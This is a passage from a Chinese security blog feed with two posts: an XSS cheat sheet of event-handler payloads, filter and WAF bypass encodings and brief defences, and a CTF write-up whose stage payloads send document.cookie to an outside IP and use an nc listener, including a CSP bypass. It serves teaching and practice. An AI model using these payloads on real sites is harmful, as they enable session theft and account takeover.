href="https://blog.csdn.net/haoel/article/details/1602108" title="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a><br><a href="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" title="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss总结</title>
      <link href="/2019/02/16/xss%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/16/xss%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067</a></p></blockquote><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h1 id="常用的XSS攻击手段和目的"><a href="#常用的XSS攻击手段和目的" class="headerlink" title="常用的XSS攻击手段和目的"></a>常用的XSS攻击手段和目的</h1><pre><code>1.盗用cookie，获取敏感信息。2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</code></pre><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><pre><code>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</code></pre><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><pre><code>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</code></pre><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><pre><code>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</code></pre><h1 id="无任何过滤情况下"><a href="#无任何过滤情况下" class="headerlink" title="无任何过滤情况下"></a>无任何过滤情况下</h1><h2 id="一些常见标签"><a href="#一些常见标签" class="headerlink" title="一些常见标签"></a>一些常见标签</h2><p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p><h3 id="lt-scirpt-gt"><a href="#lt-scirpt-gt" class="headerlink" title="<scirpt>"></a><code>&lt;scirpt&gt;</code></h3><pre><code>&lt;scirpt&gt;alert("xss");&lt;/script&gt;</code></pre><h3 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="<img>"></a><code>&lt;img&gt;</code></h3><pre><code>&lt;img src=1 onerror=alert("xss");&gt;</code></pre><h3 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="<input>"></a><code>&lt;input&gt;</code></h3><pre><code>&lt;input onfocus="alert('xss');"&gt;</code></pre><pre><code>竞争焦点，从而触发onblur事件&lt;input onblur=alert("xss") autofocus&gt;&lt;input autofocus&gt;</code></pre><pre><code>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus="alert('xss');" autofocus&gt;</code></pre><h3 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="<details>"></a><code>&lt;details&gt;</code></h3><pre><code>&lt;details ontoggle="alert('xss');"&gt;</code></pre><pre><code>使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle="alert('xss');"&gt;</code></pre><h3 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="<svg>"></a><code>&lt;svg&gt;</code></h3><pre><code>&lt;svg onload=alert("xss");&gt;</code></pre><h3 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="<select>"></a><code>&lt;select&gt;</code></h3><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</code></pre><pre><code>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt;</code></pre><h3 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="<iframe>"></a><code>&lt;iframe&gt;</code></h3><pre><code>&lt;iframe onload=alert("xss");&gt;&lt;/iframe&gt;</code></pre><h3 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="<video>"></a><code>&lt;video&gt;</code></h3><pre><code>&lt;video&gt;&lt;source onerror="alert(1)"&gt;</code></pre><h3 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="<audio>"></a><code>&lt;audio&gt;</code></h3><pre><code>&lt;audio src=x  onerror=alert("xss");&gt;</code></pre><h3 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="<body>"></a><code>&lt;body&gt;</code></h3><pre><code>&lt;body/onload=alert("xss");&gt;</code></pre><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><pre><code>&lt;bodyonscroll=alert("xss");&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><h3 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="<textarea>"></a><code>&lt;textarea&gt;</code></h3><pre><code>&lt;textarea onfocus=alert("xss"); autofocus&gt;</code></pre><h3 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="<keygen>"></a><code>&lt;keygen&gt;</code></h3><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><h3 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="<marquee>"></a><code>&lt;marquee&gt;</code></h3><pre><code>&lt;marquee onstart=alert("xss")&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><h3 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="<isindex>"></a><code>&lt;isindex&gt;</code></h3><pre><code>&lt;isindex type=image src=1 onerror=alert("xss")&gt;//仅限于IE</code></pre><h3 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h3><p><strong> PS：在无CSP的情况下才可以 </strong></p><pre><code>&lt;link rel=import href="http://127.0.0.1/1.js"&gt;</code></pre><h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><p><code>&lt;a&gt;</code>标签</p><pre><code>&lt;a href="javascript:alert(`xss`);"&gt;xss&lt;/a&gt;</code></pre><p><code>&lt;iframe&gt;</code>标签</p><pre><code>&lt;iframe src=javascript:alert('xss');&gt;&lt;/iframe&gt;</code></pre><p><code>&lt;img&gt;</code>标签</p><pre><code>&lt;img src=javascript:alert('xss')&gt;//IE7以下</code></pre><p><code>&lt;form&gt;</code>标签</p><pre><code>&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;</code></pre><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p><code>expression</code>属性</p><pre><code>&lt;img style="xss:expression(alert('xss''))"&gt; // IE7以下&lt;div style="color:rgb(''&amp;#0;x:expression(alert(1))"&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</code></pre><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h1 id="有过滤的情况下"><a href="#有过滤的情况下" class="headerlink" title="有过滤的情况下"></a>有过滤的情况下</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用<code>/</code>代替空格</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></code></pre><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>ImG sRc<span class="token operator">=</span>x onerRor<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></code></pre><h3 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>imimgg srsrcc<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></code></pre><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"</span><span class="token operator">></span></code></pre><p>利用top</p><pre><code>&lt;script&gt;top["al"+"ert"](`xss`);&lt;/script&gt;</code></pre><h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><pre><code>可利用注释、标签的优先级等1.&lt;&lt;script&gt;alert("xss");//&lt;&lt;/script&gt;2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror="alert(`xss`);"&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效3.&lt;SCRIPT&gt;var a="\\";alert("xss");//";&lt;/SCRIPT&gt;</code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>Unicode编码绕过</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;"</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')"</span><span class="token operator">></span></code></pre><p>url编码绕过</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"</span><span class="token operator">></span></code></pre><pre><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></pre><p>Ascii码绕过</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token string">"eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"</span><span class="token operator">></span></code></pre><p>hex绕过</p><pre><code>&lt;img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&gt;</code></pre><p>八进制</p><pre><code>&lt;img src=x onerror=alert('\170\163\163')&gt;</code></pre><p>base64绕过</p><pre><code>&lt;img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"&gt;</code></pre><pre><code>&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="&gt;</code></pre><h2 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h2><p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p><pre><code>&lt;img src="x" onerror=alert(`xss`);&gt;</code></pre><p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h2><p>当括号被过滤的时候可以使用throw来绕过</p><pre><code>&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"&gt;</code></pre><h2 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h2><h3 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h3><pre><code>&lt;img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</code></pre><h3 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h3><p>1.十进制IP</p><pre><code>&lt;img src="x" onerror=document.location=`http://2130706433/`&gt;</code></pre><p>2.八进制IP</p><pre><code>&lt;img src="x" onerror=document.location=`http://0177.0.0.01/`&gt;</code></pre><p>3.hex</p><pre><code>&lt;img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</code></pre><p>4.html标签中用<code>//</code>可以代替<code>http://</code></p><pre><code>&lt;img src="x" onerror=document.location=`//www.baidu.com`&gt;</code></pre><p>5.使用<code>\\</code></p><pre><code>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</code></pre><p>Windows下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190208102122-3a40fff4-2b48-1.gif" alt=""><br>Linux下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190208103630-5775e02e-2b4a-1.gif" alt=""><br>6.使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><pre><code>&lt;img src="x" onerror="document.location=`http://www。baidu。com`"&gt;//会自动跳转到百度</code></pre><h1 id="如何防止xss"><a href="#如何防止xss" class="headerlink" title="如何防止xss"></a>如何防止xss</h1><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; " ' /</code>等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度限制</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感觉总结的不是很全面，以后会查漏补缺，如果有师傅发现错误之处，还望斧正</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://html5sec.org/" title="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a><br><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" title="很全的xss总结" target="_blank" rel="noopener">很全的xss总结</a><br><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" title="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Thousand-Knocks解题记录</title>
      <link href="/2019/02/14/XSS-Thousand-Knocks%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/02/14/XSS-Thousand-Knocks%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4074" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了一个xss平台的题目，一共34题，题目还不错，这里记录一下解题记录<br>题目地址：<a href="https://knock.xss.moe/index" target="_blank" rel="noopener">传送门</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这个平台接收flag的形式和其它平台不同，得用vps或者是用xss平台去接收cookie（flag在cookie中）</p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>第一关它是告诉你你怎么去获取flag的<br>直接把你的payload在这里提交（记住一定是要在这个填入你的payload），然后用你的vps去接受flag就行了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209165910-f6c26108-2c48-1.png" alt="image.png"><br>payload</p><pre><code>http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p>然后服务器端用nc监听接收flag</p><pre><code>nc -lvvkp 1234</code></pre><p>可以看到成功接收到了flag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209170638-0255a042-2c4a-1.png" alt="image.png"></p><h2 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h2><p>第二关直接可以嵌入js代码<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171311-ec63c63c-2c4a-1.png" alt="image.png"><br>payload</p><pre><code>http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171524-3bb51308-2c4b-1.png" alt="image.png"></p><h2 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h2><p>第三关q参数可控，直接闭合a标签<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171938-d2b25d60-2c4b-1.png" alt="image.png"><br>payload</p><pre><code>http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q="&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171956-ddeee3c4-2c4b-1.png" alt="image.png"></p><h2 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h2><p>和第三关同理，只不过把双引号变成了单引号</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172148-209163d2-2c4c-1.png" alt="image.png"><br>payload</p><pre><code>http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172351-69d3e862-2c4c-1.png" alt="image.png"></p><h2 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h2><p>直接闭合textarea标签<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172508-97a813f8-2c4c-1.png" alt="image.png"><br>payload</p><pre><code>http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=&lt;/textarea&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172821-0ab721f4-2c4d-1.png" alt="image.png"></p><h2 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h2><p>直接闭合xmp<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172900-21ce7c84-2c4d-1.png" alt="image.png"><br>payload</p><pre><code>http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=&lt;/xmp&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173022-52a5ad1e-2c4d-1.png" alt="image.png"></p><h2 id="stage7"><a href="#stage7" class="headerlink" title="stage7"></a>stage7</h2><p>第七关尖括号被转义了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173128-7a559568-2c4d-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173349-ce016fac-2c4d-1.png" alt="image.png"><br>我们可以用onfocus事件，并且用它的autofocus属性去触发onfocus事件<br>payload</p><pre><code>http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS" autofocus onfocus="document.location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174003-ad542370-2c4e-1.png" alt="image.png"></p><h2 id="stage8"><a href="#stage8" class="headerlink" title="stage8"></a>stage8</h2><p>和第七关同理，只不过把双引号变成了单引号<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174302-178c26b6-2c4f-1.png" alt="image.png"></p><p>payload</p><pre><code>http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=xss' autofocus onfocus='document.location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174251-116fec86-2c4f-1.png" alt="image.png"></p><h2 id="stage9"><a href="#stage9" class="headerlink" title="stage9"></a>stage9</h2><p>和第七关同理，但是没有引号</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175510-c9b68eac-2c50-1.png" alt="image.png"><br>payload</p><pre><code>http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS autofocus onfocus=document.location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175502-c4b14618-2c50-1.png" alt="image.png"></p><h2 id="stage10"><a href="#stage10" class="headerlink" title="stage10"></a>stage10</h2><p>这题双引号被转义了，无法闭合双引号。所以我们可以考虑用javascript伪协议<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175619-f32198a4-2c50-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180032-89818660-2c51-1.png" alt="image.png"></p><pre><code>http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175846-4ac5567c-2c51-1.png" alt="image.png"></p><h2 id="stage11"><a href="#stage11" class="headerlink" title="stage11"></a>stage11</h2><p>和stage10同理</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180346-fd688420-2c51-1.png" alt="image.png"></p><p>payload</p><pre><code>http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180335-f6e291fe-2c51-1.png" alt="image.png"></p><h2 id="stage12"><a href="#stage12" class="headerlink" title="stage12"></a>stage12</h2><p>12关发现有CSP，只能默认同源下的资源加载，iframe标签也只能加载同源资源，但是有inline存在，所以我们可以用预加载Bypass掉CSP<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180949-d5ae7d3a-2c52-1.png" alt="image.png"><br>尝试构造</p><pre><code>var xss = document.createElement(`link`);xss.setAttribute(`rel`, `prefetch`);xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);document.head.appendChild(xss);</code></pre><p>最终payload</p><pre><code>http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=javascript:var xss = document.createElement(`link`);xss.setAttribute(`rel`, `prefetch`);xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);document.head.appendChild(xss);//页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209182107-698930ee-2c54-1.png" alt="image.png"></p><h2 id="stage13"><a href="#stage13" class="headerlink" title="stage13"></a>stage13</h2><p>十三关发现过滤了很多字符如window，document,cookie，img等字符，不过fuzz了一下发现svg可以用，其它的我们可以用base64编码绕过</p><pre><code>&lt;svg onload=eval(atob("ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8xMzQuMTc1LjMzLjE2NDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g"))&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209214338-b48725bc-2c70-1.png" alt="image.png"></p><h2 id="stage14"><a href="#stage14" class="headerlink" title="stage14"></a>stage14</h2><p>14关又发现CSP</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209220036-12e09902-2c73-1.png" alt="image.png"><br>但是和12关相比，它没有了unline，所以预加载的方法行不通了，但是我们可以看到这里</p><pre><code>frame-src http://*.knock.xss.moe</code></pre><p>它允许knock.xss.moe的所有子域的资源可以被frame访问，那么问题来了，我们怎么样才可以用到knock.xss.moe子域的资源呢，灵机一动：既然是所有的子域，我们可利用其它关卡嘛</p><p>尝试构造</p><pre><code>http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=alert(1);</code></pre><p>发现可以执行</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209231642-b4c18556-2c7d-1.png" alt="image.png"></p><p>然后我们再通过document.domain指定域，跨域获得flag(cookie)<br>最终payload：</p><pre><code>http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://134.175.33.164:1234/?${parent.document.cookie}`)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209231721-cbc893de-2c7d-1.png" alt="image.png"></p><h2 id="stage15"><a href="#stage15" 